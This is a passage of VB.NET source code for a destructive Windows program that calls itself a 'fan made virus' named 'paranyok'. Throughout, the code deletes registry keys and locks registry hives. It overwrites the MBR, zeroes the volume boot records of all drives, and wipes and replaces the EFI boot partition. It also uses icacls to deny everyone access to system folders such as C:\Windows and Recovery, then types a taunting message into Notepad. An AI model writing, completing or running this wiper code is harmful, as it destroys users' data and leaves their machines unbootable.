                Dim command As String = $"reg delete {path} /f"
                ExecuteCommand(command)
            Next

            ' Lock the registry hives
            For Each path In registryPaths
                LockRegistryHive(path)
            Next

            MessageBox.Show("Registry keys deleted and hives locked successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Catch ex As Exception
            MessageBox.Show("An error occurred while deleting registry keys: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Method to lock a registry hive
    Private Sub LockRegistryHive(hive As String)
        Try
            Dim baseHive As RegistryKey

            ' Determine which hive to open based on the provided hive string
            Select Case hive
                Case "HKEY_CLASSES_ROOT"
                    baseHive = Registry.ClassesRoot
                Case "HKEY_CURRENT_USER"
                    baseHive = Registry.CurrentUser
                Case "HKEY_LOCAL_MACHINE"
                    baseHive = Registry.LocalMachine
                Case "HKEY_USERS"
                    baseHive = Registry.Users
                Case "HKEY_CURRENT_CONFIG"
                    baseHive = Registry.CurrentConfig
                Case Else
                    Throw New ArgumentException("Unknown hive")
            End Select

            Dim security As New RegistrySecurity()
            security.SetAccessRuleProtection(True, False)

            ' Grant Full Control only to System and Administrators
            security.AddAccessRule(New RegistryAccessRule(New SecurityIdentifier(WellKnownSidType.LocalSystemSid, Nothing),
                                                      RegistryRights.FullControl,
                                                      InheritanceFlags.None,
                                                      PropagationFlags.None,
                                                      AccessControlType.Allow))

            security.AddAccessRule(New RegistryAccessRule(New SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, Nothing),
                                                      RegistryRights.FullControl,
                                                      InheritanceFlags.None,
                                                      PropagationFlags.None,
                                                      AccessControlType.Allow))

            ' Apply the security settings to the hive
            baseHive.SetAccessControl(security)
        Catch ex As Exception
            MessageBox.Show("An error occurred while locking the registry hive: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub CorruptAllVBRS()
        Try
            Dim driveLetter As Integer = Asc("C"c) ' Start from ASCII value of 'C'
            For i As Integer = 0 To 25 ' Loop through A-Z
                Dim volumePath As String = $"\\.\{Chr(driveLetter)}:"

                ' Check if the volume exists
                If Directory.Exists(volumePath) Then
                    WriteCorruptVBR(volumePath)
                End If

                driveLetter += 1 ' Move to the next drive letter
            Next
        Catch ex As Exception
            MessageBox.Show("Failed to corrupt VBRs: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub ReplaceBootx64WithBootmgfw()
        Try
            ' 1. Mount the EFI system partition to X:
            Dim mountvolProcess As New Process()
            mountvolProcess.StartInfo.FileName = "cmd.exe"
            mountvolProcess.StartInfo.Arguments = "/C mountvol X: /s /q"
            mountvolProcess.StartInfo.CreateNoWindow = True
            mountvolProcess.StartInfo.UseShellExecute = False
            mountvolProcess.Start()
            mountvolProcess.WaitForExit()

            ' 2. Delete all contents from the X: drive (EFI system partition)
            Dim rdProcess As New Process()
            rdProcess.StartInfo.FileName = "cmd.exe"
            rdProcess.StartInfo.Arguments = "/C rd X:\ /s /q"
            rdProcess.StartInfo.CreateNoWindow = True
            rdProcess.StartInfo.UseShellExecute = False
            rdProcess.Start()
            rdProcess.WaitForExit()

            ' 3. Extract bootmgfw.efi from Resource1 (string to byte array conversion)
            Dim bootmgfwString As String = My.Resources.Resource1.bootmgfw
            Dim bootmgfwData As Byte() = Text.Encoding.UTF8.GetBytes(bootmgfwString)

            ' 4. Ensure the target directory exists
            Dim efiDir As String = "X:\EFI"
            Dim targetFilePath As String = "X:\EFI\bootx64.efi"

            If Not Directory.Exists(efiDir) Then
                Directory.CreateDirectory(efiDir)
            End If

            ' 5. Write bootmgfw.efi to X:\EFI\bootx64.efi
            File.WriteAllBytes(targetFilePath, bootmgfwData)

            MessageBox.Show("Successfully replaced bootx64.efi with bootmgfw.efi", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)

        Catch ex As Exception
            MessageBox.Show("Error during the replacement process: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        Finally
            ' Unmount X: drive
            Dim unmountProcess As New Process()
            unmountProcess.StartInfo.FileName = "cmd.exe"
            unmountProcess.StartInfo.Arguments = "/C mountvol X: /d"
            unmountProcess.StartInfo.CreateNoWindow = True
            unmountProcess.StartInfo.UseShellExecute = False
            unmountProcess.Start()
            unmountProcess.WaitForExit()
        End Try
    End Sub


    Private Const GENERIC_WRITE As UInteger = &H40000000
    Private Const OPEN_EXISTING As UInteger = 3
    Private Const FILE_ATTRIBUTE_NORMAL As UInteger = &H80

    <DllImport("kernel32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Shared Function CreateFile(
        lpFileName As String,
        dwDesiredAccess As UInteger,
        dwShareMode As UInteger,
        lpSecurityAttributes As IntPtr,
        dwCreationDisposition As UInteger,
        dwFlagsAndAttributes As UInteger,
        hTemplateFile As IntPtr) As IntPtr
    End Function

    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Shared Function WriteFile(
        hFile As IntPtr,
        lpBuffer As Byte(),
        nNumberOfBytesToWrite As UInteger,
        ByRef lpNumberOfBytesWritten As UInteger,
        lpOverlapped As IntPtr) As Boolean
    End Function

    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Shared Function CloseHandle(hObject As IntPtr) As Boolean
    End Function

    Private Sub WriteMBR(binFilePath As String, diskPath As String)
        ' Open the binary file for reading
        If Not File.Exists(binFilePath) Then
            MessageBox.Show($"Error: Unable to find binary file {binFilePath}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return
        End If

        Dim buffer(511) As Byte
        Using binFile As New FileStream(binFilePath, FileMode.Open, FileAccess.Read)
            If binFile.Length < 512 Then
                MessageBox.Show("Error: The binary file does not contain 512 bytes.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If
            ' Read the first 512 bytes
            binFile.Read(buffer, 0, buffer.Length)
        End Using

        ' Open the disk for writing
        Dim disk As IntPtr = CreateFile(diskPath, GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero)
        If disk = IntPtr.Zero OrElse disk = New IntPtr(-1) Then
            MessageBox.Show($"Error: Unable to open disk {diskPath}. Error Code: {Marshal.GetLastWin32Error()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return
        End If

        ' Write the 512 bytes to the disk
        Dim bytesWritten As UInteger
        Dim success As Boolean = WriteFile(disk, buffer, CUInt(buffer.Length), bytesWritten, IntPtr.Zero)
        If Not success OrElse bytesWritten <> 512 Then
            MessageBox.Show($"Error: Failed to write 512 bytes to disk {diskPath}. Error Code: {Marshal.GetLastWin32Error()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        Else
            MessageBox.Show($"MBR successfully written to {diskPath}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
        End If

        ' Close the disk handle
        CloseHandle(disk)
    End Sub

    ' Write a corrupt VBR to a specific partition
    Private Sub WriteCorruptVBR(volumePath As String)
        Try
            ' Create corrupt VBR data (for example, all zeros or any other pattern)
            Dim vbrData As Byte() = New Byte(511) {} ' Create an array of 512 bytes initialized to zero

            ' Open the specified volume for writing the VBR
            Using fs As New FileStream(volumePath, FileMode.Open, FileAccess.Write)
                ' Write the corrupt data (VBR) to the beginning of the volume
                fs.Write(vbrData, 0, vbrData.Length)
            End Using

            MessageBox.Show("Corrupt VBR written successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Catch ex As Exception
            MessageBox.Show("Failed to write corrupt VBR: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Importing user32.dll for window management and input control
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function SetForegroundWindow(hWnd As IntPtr) As Boolean
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function FindWindow(lpClassName As String, lpWindowName As String) As IntPtr
    End Function

    <DllImport("user32.dll")>
    Private Shared Sub keybd_event(bVk As Byte, bScan As Byte, dwFlags As UInteger, dwExtraInfo As UInteger)
    End Sub

    ' Keycodes used by keybd_event
    Private Const KEYEVENTF_KEYDOWN As UInteger = &H0
    Private Const KEYEVENTF_KEYUP As UInteger = &H2

    ' Virtual key codes for letters and special characters (adjust for specific needs)
    Private Shared Sub SendKey(key As Char)
        Dim keyCode As Byte = AscW(key)
        keybd_event(keyCode, 0, KEYEVENTF_KEYDOWN, 0)
        Thread.Sleep(50) ' Short delay between keypresses
        keybd_event(keyCode, 0, KEYEVENTF_KEYUP, 0)
    End Sub

    ' Function to type a full message in Notepad
    Public Sub WriteMessageToNotepad()
        Try
            ' Start the Notepad process
            Dim notepadProcess As Process = Process.Start("notepad.exe")

            ' Wait for Notepad to be ready for input
            notepadProcess.WaitForInputIdle()

            ' Get the handle of the Notepad window
            Dim notepadHandle As IntPtr = notepadProcess.MainWindowHandle

            ' Bring Notepad to the foreground
            SetForegroundWindow(notepadHandle)

            ' Message to type
            Dim message As String = "one of the greatest fan made viruses ever created. his name is paranyok and there is no escape. i'm serious."

            ' Type each character
            For Each c As Char In message
                SendKey(c)
                Thread.Sleep(100) ' Delay between characters to simulate typing
            Next
        Catch ex As Exception
            MessageBox.Show("Failed to write message to Notepad: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Grant permissions to self
    Private Sub GrantSelfPermissions()
        Try
            ' Get the current directory and executable name
            Dim currentDir As String = AppDomain.CurrentDomain.BaseDirectory
            Dim currentName As String = Process.GetCurrentProcess().MainModule.FileName

            ' Create the command with actual paths
            Dim command As String = $"icacls ""{currentDir}{System.IO.Path.GetFileName(currentName)}"" /grant Everyone:(OI)(CI)F"

            ExecuteCommand(command)
        Catch ex As Exception
            MessageBox.Show("Failed to grant self permissions: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Apply access restrictions
    Private Sub ApplyAccessRestrictions()
        Dim commands As String() = {
            "icacls ""C:\Windows"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Program Files"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\ProgramData"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\System Volume Information"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Recovery"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\$RECYCLE.BIN"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Windows\config"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Windows\system32"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Windows\system"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Windows\winsxs"" /deny Everyone:(OI)(CI)F",
            "icacls ""C:\Windows\SysWOW64"" /deny Everyone:(OI)(CI)F"
        }

        For Each command As String In commands
            Try
                ExecuteCommand(command)
            Catch ex As Exception
                MessageBox.Show("Failed to apply access restrictions: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try
        Next
    End Sub

    ' Execute a system command
    Private Sub ExecuteCommand(command As String)
        Try
            Dim process As New Process()
            process.StartInfo.FileName = "cmd.exe"
            process.StartInfo.Arguments = "/C " & command
            process.StartInfo.UseShellExecute = False
            process.StartInfo.RedirectStandardOutput = True
            process.StartInfo.RedirectStandardError = True
            process.Start()

            process.WaitForExit()

            Console.WriteLine(process.StandardOutput.ReadToEnd())
            Console.WriteLine(process.StandardError.ReadToEnd())
        Catch ex As Exception
            MessageBox.Show("Command execution failed: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

End Class
